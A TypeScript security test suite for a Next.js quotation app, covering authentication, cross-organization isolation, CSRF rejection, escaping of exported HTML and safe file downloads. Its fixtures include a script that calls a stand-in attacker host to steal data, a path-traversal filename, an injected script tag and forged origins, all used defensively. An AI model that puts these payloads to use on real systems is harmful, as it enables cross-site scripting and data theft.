import test, {before,after} from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {NextRequest} from 'next/server';
import {GET,POST,PATCH} from '../src/app/api/[...path]/route';
import {closeDb} from '../src/lib/db';
import {login,SESSION_COOKIE} from '../src/lib/auth';
import * as service from '../src/lib/service';
import type {User,QuoteInput,Quote} from '../src/lib/contracts';
import {fieldValue} from '../src/lib/contracts';

const root=fs.mkdtempSync(path.join(os.tmpdir(),'quovoy-security-'));
const prior={data:process.env.QUOVOY_DATA_DIR,demo:process.env.DEMO_MODE,provider:process.env.AI_PROVIDER,pub:process.env.QUOVOY_PUBLIC_DEPLOYMENT,origin:process.env.APP_ORIGIN};
let sales:{user:User;token:string},manager:{user:User;token:string},outsider:{user:User;token:string};
before(()=>{
  process.env.QUOVOY_DATA_DIR=root;process.env.DEMO_MODE='true';process.env.AI_PROVIDER='demo';process.env.QUOVOY_PUBLIC_DEPLOYMENT='false';process.env.APP_ORIGIN='http://localhost:3210';
  sales=login('sales@quovoy.demo','DemoSales!2026');manager=login('manager@quovoy.demo','DemoManager!2026');outsider=login('isolation@quovoy.demo','DemoIsolation!2026');
});
after(()=>{
  closeDb();fs.rmSync(root,{recursive:true,force:true});
  for(const [key,val] of Object.entries({QUOVOY_DATA_DIR:prior.data,DEMO_MODE:prior.demo,AI_PROVIDER:prior.provider,QUOVOY_PUBLIC_DEPLOYMENT:prior.pub,APP_ORIGIN:prior.origin}))if(val===undefined)delete process.env[key];else process.env[key]=val;
});
async function request(route:string,method='GET',token?:string,body?:unknown,extra:Record<string,string>={}) {
  const headers:Record<string,string>={...extra};if(token)headers.cookie=`${SESSION_COOKIE}=${token}`;
  let content:BodyInit|undefined;
  if(body instanceof FormData)content=body;
  else if(body!==undefined){headers['content-type']='application/json';content=JSON.stringify(body);}
  const req=new NextRequest(`http://localhost:3210/api/${route}`,{method,headers,body:content});
  const fn=method==='GET'?GET:method==='PATCH'?PATCH:POST;
  return fn(req,{params:Promise.resolve({path:route.split('?')[0].split('/')})});
}
async function fixture(suffix:string,product='Precision bolt') {
  const text=`Customer: Security Fixture ${suffix}\nProduct: ${product}\nModel: S-${suffix}\nQuantity: 100\nUnit: pcs\nMaterial: Steel 304\nDimensions: M6x20`;
  const {rfqId}=await service.importRFQ(sales.user,text,[]);
  const d=service.getRFQ(sales.user,rfqId);
  for(const f of [...d.fields,...d.items.flatMap(i=>i.fields)])if(fieldValue(f))service.updateField(sales.user,rfqId,f.id,fieldValue(f),true);
  const detail=service.getRFQ(sales.user,rfqId);
  const input:QuoteInput={unitCosts:{[detail.items[0].id]:'20'},freight:'200',otherCosts:'0',markupPercent:'25',exchangeRate:'7.2',costCurrency:'CNY',quoteCurrency:'USD',validUntil:'2099-12-31',deliveryTerms:'30 days after approved purchase order',paymentTerms:'100% before shipment',incoterms:'FCA Shanghai'};
  const quote=service.createQuote(sales.user,rfqId,input);
  return {rfqId,detail,quote};
}

test('HTTP session is required for RFQ, original file and quote exports',async()=>{
  const {rfqId,detail,quote}=await fixture('AUTH');
  for(const route of [`rfqs/${rfqId}`,`documents/${detail.documents[0].id}`,`quotes/${quote.id}/export?kind=internal`]) {
    const res=await request(route);assert.equal(res.status,401);assert.equal((await res.json()).code,'LOGIN_REQUIRED');
  }
});

test('HTTP route denies cross-organization source reads and writes across nested resources',async()=>{
  const {rfqId,detail,quote}=await fixture('ORG');
  const task=service.createTask(sales.user,{rfqId,title:'Call customer',ownerId:sales.user.id,dueAt:'2099-01-01T00:00:00Z'});
  const beforeRevision=service.getRFQ(sales.user,rfqId).revision;
  const cases:[string,string,unknown?][]=[
    [`rfqs/${rfqId}`,'GET'],[`documents/${detail.documents[0].id}`,'GET'],[`quotes/${quote.id}/export?kind=internal`,'GET'],
    [`rfqs/${rfqId}/fields/${detail.fields[0].id}`,'PATCH',{value:'Other organization wrote this',confirmed:true}],
    [`rfqs/${rfqId}/items`,'POST'],[`rfqs/${rfqId}/retry`,'POST'],[`rfqs/${rfqId}/review-time`,'POST',{seconds:120}],
    [`tasks/${task.id}`,'PATCH',{status:'completed'}],
  ];
  for(const [route,method,body] of cases){const res=await request(route,method,outsider.token,body);assert.equal(res.status,404,`${method} ${route}`);}
  assert.equal(service.getRFQ(sales.user,rfqId).revision,beforeRevision);
  assert.equal(service.getRFQ(sales.user,rfqId).reviewSeconds,0);
  assert.equal(service.listTasks(sales.user).find(t=>t.id===task.id)?.status,'pending');
});

test('cross-site modifying requests are denied before any mutation',async()=>{
  const {rfqId}=await fixture('CSRF');
  for(const headers of [{origin:'https://attacker.invalid'},{'sec-fetch-site':'cross-site'}] as Record<string,string>[]){
    const res=await request(`rfqs/${rfqId}`,'PATCH',sales.token,{status:'won'},headers);
    assert.equal(res.status,403);assert.equal((await res.json()).code,'ORIGIN_REJECTED');
  }
  assert.equal(service.getRFQ(sales.user,rfqId).status,'new');
});

test('caller-supplied organization, role and owner cannot authorize approval or move data',async()=>{
  const {rfqId,quote}=await fixture('ROLE');service.submitQuote(sales.user,quote.id);
  const res=await request(`quotes/${quote.id}/approve`,'POST',sales.token,{role:'manager',organizationId:'org-demo'});
  assert.equal(res.status,403);assert.equal(service.getQuote(sales.user,quote.id).status,'pending');
  const assign=await request(`rfqs/${rfqId}`,'PATCH',sales.token,{ownerId:outsider.user.id,organizationId:outsider.user.organizationId});
  assert.equal(assign.status,422);assert.equal(service.getRFQ(sales.user,rfqId).ownerId,sales.user.id);
});

test('original files download byte-for-byte under authentication with forced attachment headers',async()=>{
  const original=Buffer.from('<script>fetch("https://attacker.invalid/steal")</script>\nUNTRUSTED ORIGINAL');
  const out=await service.importRFQ(sales.user,'Customer: Original File Boundary',[{filename:'../../attack.html',bytes:original}]);
  const d=service.getRFQ(sales.user,out.rfqId),doc=d.documents.find(x=>x.filename==='attack.html')!;
  assert.equal(doc.status,'manual');
  const res=await request(`documents/${doc.id}`,'GET',sales.token);
  assert.equal(res.status,200);assert.deepEqual(Buffer.from(await res.arrayBuffer()),original);
  assert.equal(res.headers.get('content-type'),'application/octet-stream');assert.equal(res.headers.get('x-content-type-options'),'nosniff');
  assert.match(res.headers.get('content-disposition')!,/^attachment;/);assert.match(res.headers.get('content-security-policy')!,/sandbox/);
  assert.equal(fs.existsSync(path.join(root,'attack.html')),false);
});

test('official HTML exports escape source markup, hide internal cost and preserve approval boundary',async()=>{
  const injected='<script>alert("RFQ")</script>';
  const {quote}=await fixture('XSS',`Precision bolt ${injected}`);
  const refused=await request(`quotes/${quote.id}/export?kind=formal`,'GET',sales.token);assert.equal(refused.status,403);
  service.submitQuote(sales.user,quote.id);service.approveQuote(manager.user,quote.id);
  const exported=await request(`quotes/${quote.id}/export?kind=formal`,'GET',sales.token);
  assert.equal(exported.status,200);const html=await exported.text();
  assert.ok(html.includes('&lt;script&gt;'));assert.ok(!html.includes(injected));assert.ok(!html.includes('Internal calculation'));assert.ok(!html.includes('gross margin'));
  assert.match(exported.headers.get('content-security-policy')!,/sandbox/);
  assert.equal(service.getQuote(sales.user,quote.id).sentAt,null);assert.equal(service.listTasks(sales.user).filter(t=>t.quoteId===quote.id).length,0);
});

test('turning off public demo access invalidates pre-existing demo sessions and credentials',async()=>{
  process.env.QUOVOY_PUBLIC_DEPLOYMENT='true';
  try {
    const session=await request('session','GET',sales.token);const body=await session.json();assert.equal(body.demoMode,false);assert.equal(body.user,null);
    const denied=await request('rfqs','GET',sales.token);assert.equal(denied.status,401);
    const signin=await request('login','POST',undefined,{email:'sales@quovoy.demo',password:'DemoSales!2026'});assert.equal(signin.status,401);
  } finally {process.env.QUOVOY_PUBLIC_DEPLOYMENT='false';}
});

test('quote customer identity is a server-owned immutable snapshot after RFQ customer revisions',async()=>{
  const {rfqId,quote}=await fixture('CUSTOMER');
  const created=await request(`rfqs/${rfqId}/quotes`,'POST',sales.token,{...quote.input,customerName:'Forged Customer From Client'});
  assert.equal(created.status,200);const snapshot=await created.json();
  assert.equal(snapshot.input.customerName,'Security Fixture CUSTOMER');
  service.submitQuote(sales.user,snapshot.id);service.approveQuote(manager.user,snapshot.id);
  const customer=service.getRFQ(sales.user,rfqId).fields.find(f=>f.key==='customer')!;
  service.updateField(sales.user,rfqId,customer.id,'Revised Customer B',true);
  const internal=await request(`quotes/${snapshot.id}/export?kind=internal`,'GET',sales.token);
  assert.equal(internal.status,200);const html=await internal.text();
  assert.ok(html.includes('Customer: Security Fixture CUSTOMER'));
  assert.ok(!html.includes('Customer: Revised Customer B'));assert.ok(!html.includes('Forged Customer From Client'));
  const formal=await request(`quotes/${snapshot.id}/export?kind=formal`,'GET',sales.token);assert.equal(formal.status,403);
});

test('duplicate content hashing includes component boundaries to avoid dropping distinct inquiries',async()=>{
  // Without length-prefixing or an equivalent canonical envelope these produce
  // the same concatenated bytes: "Customer: HashAbc.txtunrelated attachment".
  const bytes=Buffer.from('unrelated attachment');
  const a=await service.importRFQ(sales.user,'Customer: HashA',[{filename:'bc.txt',bytes}]);
  const b=await service.importRFQ(sales.user,'Customer: HashAb',[{filename:'c.txt',bytes}]);
  assert.equal(a.duplicate,false);assert.equal(b.duplicate,false);assert.notEqual(a.rfqId,b.rfqId);
  assert.equal(service.getRFQ(sales.user,a.rfqId).customer,'HashA');assert.equal(service.getRFQ(sales.user,b.rfqId).customer,'HashAb');
});

test('invalid or oversized JSON receives actionable client errors',async()=>{
  const malformed=new NextRequest('http://localhost:3210/api/login',{method:'POST',headers:{'content-type':'application/json'},body:'{broken'});
  const invalid=await POST(malformed,{params:Promise.resolve({path:['login']})});assert.equal(invalid.status,400);
  const tooLarge=await request('login','POST',undefined,{email:'a'.repeat(100001),password:'x'});assert.equal(tooLarge.status,413);
});

test('host origin regression accepts browser 127.0.0.1 when Next internal URL is localhost',async()=>{
  const {rfqId}=await fixture('HOST-ORIGIN');
  const priorOrigin=process.env.APP_ORIGIN;delete process.env.APP_ORIGIN;
  try {
    // request() uses localhost in NextRequest.url; Host represents the browser's address.
    const accepted=await request(`rfqs/${rfqId}/review-time`,'POST',sales.token,{seconds:60},{host:'127.0.0.1:3210',origin:'http://127.0.0.1:3210','sec-fetch-site':'same-origin'});
    assert.equal(accepted.status,200);assert.equal((await accepted.json()).reviewSeconds,60);
    const rejected=await request(`rfqs/${rfqId}/review-time`,'POST',sales.token,{seconds:600},{host:'127.0.0.1:3210',origin:'https://evil.invalid','sec-fetch-site':'same-origin'});
    assert.equal(rejected.status,403);assert.equal((await rejected.json()).code,'ORIGIN_REJECTED');
    assert.equal(service.getRFQ(sales.user,rfqId).reviewSeconds,60);
  } finally {if(priorOrigin===undefined)delete process.env.APP_ORIGIN;else process.env.APP_ORIGIN=priorOrigin;}
});

test('email regeneration regression updates carried automatic drafts and preserves authored messages across frozen versions',async()=>{
  const {rfqId,quote}=await fixture('EMAIL-VERSIONS');
  const itemId=Object.keys(quote.input.unitCosts)[0];
  assert.equal(quote.input.emailBody,undefined);assert.match(quote.emailBody,/USD 381\.94/);
  const automatic=await request(`rfqs/${rfqId}/quotes`,'POST',sales.token,{
    ...quote.input,unitCosts:{[itemId]:'30'},deliveryTerms:'45 days after approved purchase order',paymentTerms:'50% deposit and 50% before shipment',
    emailSubject:quote.emailSubject,emailBody:quote.emailBody,
  });
  assert.equal(automatic.status,200);const next=await automatic.json() as Quote;
  assert.equal(next.input.emailBody,undefined);assert.equal(next.input.emailSubject,undefined);
  assert.equal(next.totals.total,'555.56');assert.match(next.emailBody,/USD 555\.56/);assert.ok(!next.emailBody.includes('381.94'));
  assert.ok(next.emailBody.includes('45 days after approved purchase order'));assert.ok(next.emailBody.includes('50% deposit and 50% before shipment'));
  assert.match(next.emailSubject,/QV-2/);
  assert.equal(service.getQuote(sales.user,quote.id).emailBody,quote.emailBody);assert.equal(service.getQuote(sales.user,quote.id).totals.total,'381.94');

  const authoredBody='Dear customer,\nPlease use the attached approved quotation as the commercial reference.\nKind regards,\nA named sales representative';
  const authoredSubject='Manually written quotation correspondence';
  const manual=await request(`rfqs/${rfqId}/quotes`,'POST',sales.token,{...next.input,emailSubject:authoredSubject,emailBody:authoredBody});
  assert.equal(manual.status,200);const third=await manual.json() as Quote;
  const revised=await request(`rfqs/${rfqId}/quotes`,'POST',sales.token,{...third.input,unitCosts:{[itemId]:'40'},deliveryTerms:'60 days after approved purchase order',emailSubject:third.emailSubject,emailBody:third.emailBody});
  assert.equal(revised.status,200);const fourth=await revised.json() as Quote;
  assert.notEqual(fourth.totals.total,third.totals.total);
  assert.equal(fourth.input.emailBody,authoredBody);assert.equal(fourth.emailBody,authoredBody);assert.equal(fourth.emailSubject,authoredSubject);
  assert.equal(service.getQuote(sales.user,third.id).emailBody,authoredBody);assert.equal(service.getQuote(sales.user,third.id).input.deliveryTerms,'45 days after approved purchase order');
  assert.equal(service.getQuote(sales.user,next.id).emailBody,next.emailBody);
});
